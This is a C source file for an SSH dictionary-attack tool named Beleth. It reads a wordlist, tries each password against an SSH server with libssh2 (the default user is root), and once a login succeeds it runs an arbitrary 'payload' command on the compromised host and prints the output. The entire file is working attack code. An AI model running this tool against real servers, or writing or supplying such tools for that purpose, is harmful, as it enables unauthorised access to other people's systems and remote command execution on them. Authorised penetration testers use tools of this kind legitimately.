/*
 * Beleth - SSH Dictionary Attack
 */ 

#include <libssh2.h>
#include <libssh2_sftp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

#define MAX_PW_LENGTH 51

/* Linked list to hold the word list */
struct pw_list
{
    char pw[MAX_PW_LENGTH];
    struct pw_list *next;
};

struct pw_list *head = NULL;
struct pw_list *tail = NULL;

/* 
 * Initiate the linked list with the first element
 * Returns -1 on error. 1 on success
 */
int init_pw_list(char *pw) {
    struct pw_list *ptr = (struct pw_list*)malloc(sizeof(struct pw_list));

    if(ptr == NULL)
    {
        fprintf(stderr,"[!] Creating password linked list failed.\n");
        return -1;
    }
	strncpy(ptr->pw, pw, MAX_PW_LENGTH);
    ptr->next = NULL;

    head = tail = ptr;
    return 1;	
}

/*
 * Add entry to the end of the linked list
 * Returns -1 on error. 1 on success
 */
int add_pw_list(char *pw) {
	if(head == NULL)  
        return (init_pw_list(pw));
	
    struct pw_list *ptr = (struct pw_list*)malloc(sizeof(struct pw_list));
    if(ptr == NULL) {
        fprintf(stderr,"[!] Couldn't add to linked list.\n");
        return -1;
    }

    strncpy(ptr->pw,pw,MAX_PW_LENGTH);
    ptr->next = NULL;
	
    tail->next = ptr;
    tail = ptr;

    return 1;
}

/*
 * Destroy the linked list and free the memory
 */
void destroy_pw_list(void) {
	struct pw_list *ptr = head;
	
	while (ptr != NULL) {
		printf("Destroying: %s\n", head->pw);
		ptr = head->next;
		free(head);
		head = ptr;
	}
}

/* 
 * Add each line of the wordlist to the linked list
 */
int read_wordlist(char *path) {
	FILE *wordlist;
	char line[256];
	
	wordlist = fopen(path,"r");
	if (wordlist == NULL) {
		fprintf(stderr,"[!] Unable to open file %s\n",path);
		return -1;
	}
	
	while (fgets(line,sizeof(line)-1, wordlist) != NULL) {
			line[strlen(line)-1] = '\0';
			add_pw_list(line);
	}
	fclose(wordlist);
	return 1;
}

/* 
 * Taken from libssh2 examples 
 * Used while dropping the payload and waiting for the response.
 */
static int waitsocket(int socket_fd, LIBSSH2_SESSION *session) {
    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
 
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd);
 
    FD_SET(socket_fd, &fd);
 
    /* now make sure we wait in the correct direction */ 
    dir = libssh2_session_block_directions(session);

 
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
 
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
 
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
 
    return rc;
}

/*
 * Close libssh2 variables out and terminate sockfd 
 */
void session_cleanup(int sock, LIBSSH2_SESSION *session) {
	libssh2_session_disconnect(session, "exit");
    libssh2_session_free(session);
    close(sock);
}

/* 
 * Setup socket file descriptor with a connection 
 * to char *host using int port
 * session pointer should be properly initialized prior to calling this
 * session = libssh2_session_init();
 */
int session_init(char *host, int port, LIBSSH2_SESSION *session) {
	int sock;
	unsigned long hostaddr;
	struct sockaddr_in sin;
	
	hostaddr = inet_addr(host);
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = hostaddr;
    if (connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) 
        return -1;

	libssh2_session_set_timeout(session, 5000);

	if (libssh2_session_handshake(session, sock)) 
		return -1;
    
	return sock;
 
}

int drop_payload(int sock, LIBSSH2_SESSION *session, char *cmdline) {
	int rc;
	LIBSSH2_CHANNEL *channel;
	
	/* Request a shell */ 
    if (!(channel = libssh2_channel_open_session(session))) {

        fprintf(stderr, "[!] Unable to open a session\n");
        session_cleanup(sock, session);
    }
 
    /* Execute cmdline remotely and display response */    
    while ( ( rc = libssh2_channel_exec(channel, cmdline) ) == LIBSSH2_ERROR_EAGAIN )
		waitsocket(sock,session);
		
	if (rc != 0) {
		fprintf(stderr, "[!] CMD Exec failed.\n");
		return -1;
	}
	
	while(1) {
		do
		{
			char buffer[65535];
			rc = libssh2_channel_read( channel, buffer, sizeof(buffer) );
			
			if (rc > 0)
				printf("%s",buffer);
		}while (rc > 0);
		
		if ( rc == LIBSSH2_ERROR_EAGAIN )
			waitsocket(sock, session);
		else
			break;
	}
	
	while ( (rc = libssh2_channel_close(channel)) == LIBSSH2_ERROR_EAGAIN )
		waitsocket(sock,session);
		
	if (channel) {
        libssh2_channel_free(channel);

        channel = NULL;
    }
	
	return 1;
}

/* Display beleth command usage */
void print_help(char *cmd) {
	fprintf(stderr,"Usage: %s [OPTIONS]\n",cmd);
	fprintf(stderr,"\t-c [payload]\tExecute payload on remote server once logged in\n");
	fprintf(stderr,"\t-h\t\tDisplay this help\n");
	fprintf(stderr,"\t-l [threads]\tLimit threads to given number. Default: 4\n");
	fprintf(stderr,"\t-p [port]\tSpecify remote port\n");
	fprintf(stderr,"\t-t [target]\tAttempt connections to this server\n");
	fprintf(stderr,"\t-u [user]\tAttempt connection using this username\n");
	fprintf(stderr,"\t-v\t\tTurn on verbose mode\n");
	fprintf(stderr,"\t-w [wordlist]\tUse this wordlist. Defaults to wordlist.txt\n");	
}

int main(int argc, char *argv[]) {
    int rc, sock, i, remote_port = 22, auth = 0, c_opt, verbose = 0;
    int threads=4;    
    const char *fingerprint;
    char host[21] = "127.0.0.1", username[50] = "root", str_wordlist[256] = "wordlist.txt";
    char cmdline[256] = "uname -a && id";
    LIBSSH2_SESSION *session;
    struct pw_list *pw_ptr = head;
 
	rc = libssh2_init (0);

	if (rc != 0) {
		fprintf (stderr, "[!] libssh2 initialization failed (%d)\n", rc);
		return 1;
	}
	
	session = libssh2_session_init();
 
    if (argc > 1) {
		while ((c_opt = getopt(argc, argv, "hvp:t:u:w:c:l:")) != -1) {
			switch(c_opt) {
					case 'h':
						print_help(argv[0]);
						exit(0);
						break;
					case 'v':
						++verbose;
						break;
					case 'p':
						remote_port = atoi(optarg);
						if (remote_port <= 0) {
							fprintf(stderr, "[!] Must enter valid integer for port\n");
							exit(1);
						}
						break;
					case 't':
						strncpy(host,optarg,sizeof(host)-1);
						break;
					case 'u':
						strncpy(username,optarg,sizeof(username)-1);
						break;
					case 'w':
						strncpy(str_wordlist,optarg,sizeof(str_wordlist)-1);
						break;
					case 'c':
						strncpy(cmdline,optarg,sizeof(cmdline)-1);
						break;
					case 'l':
						threads = atoi(optarg);
						if (threads <= 0 || threads >= 11) {
							fprintf(stderr, "[!] Thread limit must be between 1 and 10\n");
							exit(1);
						}
						break;
					default:
						fprintf(stderr, "[!] Invalid option %c\n",c_opt);
						exit(1);
			}
		}
    } else {
		print_help(argv[0]);
		exit(1);
	}
	
	/* Initiate the linked list using the given wordlist */
    if (read_wordlist(str_wordlist) == -1)
		return 1;

	if (verbose > 0) 
		fprintf(stderr, "[*] Connecting to: %s:%d\n",host,remote_port);
    sock = session_init(host,remote_port,session);
    if (sock == -1) { 
		fprintf(stderr,"[!] Unable to connect to %s:%d\n", host,remote_port);
		exit(1);
	}

	if (verbose > 0) {
		fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
		fprintf(stderr, "[*] Fingerprint: ");
		for(i = 0; i < 20; i++) {
			fprintf(stderr, "%02X ", (unsigned char)fingerprint[i]);
		}
		fprintf(stderr, "\n");
	}
		
	pw_ptr = head;
	
	while (pw_ptr != NULL) {
		if (verbose > 0)
			fprintf(stderr,"[+] Trying %s %s\n",username,pw_ptr->pw);
		if ((rc=libssh2_userauth_password(session, username, pw_ptr->pw))) {
			if (rc != LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
					session_cleanup(sock, session);
					
					session = libssh2_session_init();
	
					sock = session_init(host,remote_port, session);
					if (sock == -1) {
						fprintf(stderr, "[!] Unable to reconnect to %s:%d\n",host,remote_port);
						session_cleanup(sock,session);
						destroy_pw_list();
						exit(1);
					}
			}
		} else {
			fprintf(stderr, "[*] Authentication succeeded (%s:%s).\n",username, pw_ptr->pw);
			auth=1;
			break;
		}
		pw_ptr = pw_ptr->next;
	}
 
	if (auth == 1) {
		if (drop_payload(sock,session,(char *)cmdline) == -1) {
			fprintf(stderr, "Error executing command.\n");
			destroy_pw_list();
			exit(1);
		}   
	} else {
		fprintf(stderr, "[!] No password matches found.\n");
	}
 
	/* proper cleanup */
    session_cleanup(sock, session);
	libssh2_exit();
	destroy_pw_list();
    return 0;
}
